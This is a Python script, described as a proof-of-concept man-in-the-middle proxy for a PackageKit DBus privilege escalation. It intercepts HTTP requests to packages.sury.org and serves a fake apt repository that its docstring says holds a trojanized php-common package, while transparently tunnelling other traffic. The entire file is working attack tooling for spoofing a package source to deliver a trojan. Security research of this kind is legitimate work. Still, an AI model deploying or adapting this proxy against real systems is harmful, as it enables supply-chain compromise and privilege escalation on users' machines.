#!/usr/bin/env python3
"""
MITM proxy for PackageKit DBus privilege escalation PoC.

Intercepts HTTP requests to packages.sury.org and serves a fake apt
repository containing a trojanized php-common package. All other
traffic (HTTPS CONNECT) is tunneled transparently.

Usage: python3 proxy.py [--port 8080] [--repo-dir ./repo]
"""
import argparse
import datetime
import os
import select
import socket
import threading
from urllib.parse import unquote, urlparse

def log(msg):
    ts = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"[{ts}] {msg}", flush=True)

def serve_repo_file(client, path, repo_dir):
    """Map an incoming URL path to a local repo file and serve it."""
    candidates = []

    if "InRelease" in path:
        candidates.append(os.path.join(repo_dir, "dists/bullseye/InRelease"))
    elif "Release.gpg" in path:
        candidates.append(os.path.join(repo_dir, "dists/bullseye/Release.gpg"))
    elif "Release" in path:
        candidates.append(os.path.join(repo_dir, "dists/bullseye/Release"))
    elif "Packages.gz" in path:
        candidates.append(os.path.join(repo_dir, "dists/bullseye/main/binary-amd64/Packages.gz"))
    elif "Packages" in path:
        candidates.append(os.path.join(repo_dir, "dists/bullseye/main/binary-amd64/Packages"))

    # pool/ downloads — strip the /php/ prefix used by sury.org
    if "pool/" in path:
        tail = path.split("/php/", 1)[-1] if "/php/" in path else path.lstrip("/")
        candidates.append(os.path.join(repo_dir, tail))

    # generic fallback
    candidates.append(os.path.join(repo_dir, path.lstrip("/")))

    for fpath in candidates:
        if os.path.isfile(fpath):
            data = open(fpath, "rb").read()
            ctype = "application/gzip" if fpath.endswith(".gz") else "application/octet-stream"
            hdr = (
                f"HTTP/1.1 200 OK\r\n"
                f"Content-Length: {len(data)}\r\n"
                f"Content-Type: {ctype}\r\n"
                f"Connection: close\r\n\r\n"
            )
            client.sendall(hdr.encode() + data)
            log(f"  SERVED {os.path.basename(fpath)} ({len(data)} B)")
            return

    log(f"  404 {path}")
    client.sendall(b"HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")

def tunnel(client, host, port):
    remote = None
    try:
        remote = socket.create_connection((host, port), timeout=10)
        client.sendall(b"HTTP/1.1 200 Connection Established\r\n\r\n")
        log(f"  TUNNEL {host}:{port}")
        pair = [client, remote]
        while True:
            r, _, x = select.select(pair, [], pair, 30)
            if x or not r:
                break
            for s in r:
                chunk = s.recv(65536)
                if not chunk:
                    return
                (remote if s is client else client).sendall(chunk)
    except Exception as e:
        log(f"  TUNNEL ERR {host}:{port}: {e}")
    finally:
        if remote:
            try:
                remote.close()
            except Exception:
                pass

def handle(client, addr, repo_dir):
    try:
        buf = b""
        while b"\r\n\r\n" not in buf:
            chunk = client.recv(4096)
            if not chunk:
                return
            buf += chunk

        line = buf.decode("latin-1").split("\r\n")[0]
        parts = line.split()
        if len(parts) < 2:
            return
        method, url = parts[0], parts[1]
        log(f"{addr[0]}  {line}")

        if method == "CONNECT":
            host, _, port = url.partition(":")
            tunnel(client, host, int(port or 443))
        elif "packages.sury.org" in url:
            path = unquote(urlparse(url).path)
            log(f"  INTERCEPT {path}")
            serve_repo_file(client, path, repo_dir)
        else:
            client.sendall(b"HTTP/1.1 502 Bad Gateway\r\n\r\n")
    except Exception as e:
        log(f"  ERR {e}")
    finally:
        client.close()

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--repo-dir", default=os.path.join(os.path.dirname(__file__), "repo"))
    args = ap.parse_args()

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", args.port))
    srv.listen(20)
    log(f"Proxy on :{args.port}  repo={args.repo_dir}")

    while True:
        c, a = srv.accept()
        threading.Thread(target=handle, args=(c, a, args.repo_dir), daemon=True).start()

if __name__ == "__main__":
    main()
